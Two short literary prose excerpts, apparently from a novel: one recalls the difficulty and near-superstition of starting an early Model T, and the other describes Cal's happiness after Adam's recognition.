It is hard now to imagine the difficulty of learning to start, drive, and maintain an automobile. Not only was the whole process complicated, but one had to start from scratch. Today’s children breathe in the theory, habits, and idiosyncracies of the internal combustion engine in their cradles, but then you started with the blank belief that it would not run at all, and sometimes you were right. Also, to start the engine of a modern car you do just two things, turn a key and touch the starter. Everything else is automatic. The process used to be more complicated. It required not only a good memory, a strong arm, an angelic temper, and a blind hope, but also a certain amount of practice of magic, so that a man about to turn the crank of a Model T might be seen to spit on the ground and whisper a spell.

Adam’s recognition brought a ferment of happiness to Cal. He walked on the balls of his feet. He smiled more often than he frowned, and the secret darkness was seldom on him.
